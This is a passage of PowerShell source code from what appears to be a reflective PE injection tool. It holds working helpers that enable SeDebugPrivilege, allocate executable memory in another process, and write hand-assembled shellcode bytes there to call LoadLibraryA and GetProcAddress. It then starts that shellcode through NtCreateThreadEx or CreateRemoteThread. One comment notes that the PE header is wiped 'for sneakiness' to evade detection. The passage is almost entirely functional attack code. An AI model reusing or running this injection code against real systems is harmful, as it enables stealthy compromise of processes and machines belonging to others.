        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
        [IntPtr]
        $EndAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr]::Zero
        if ($PsCmdlet.ParameterSetName -eq "Size")
        {
            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        }
        else
        {
            $FinalEndAddress = $EndAddress
        }
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Invoke-CreateRemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
        
        #Write FunctionName to memory (will be used in GetProcAddress)
        $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RFuncNamePtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($FunctionNameSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        #todo: need to have detection for when to get by ordinal
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        
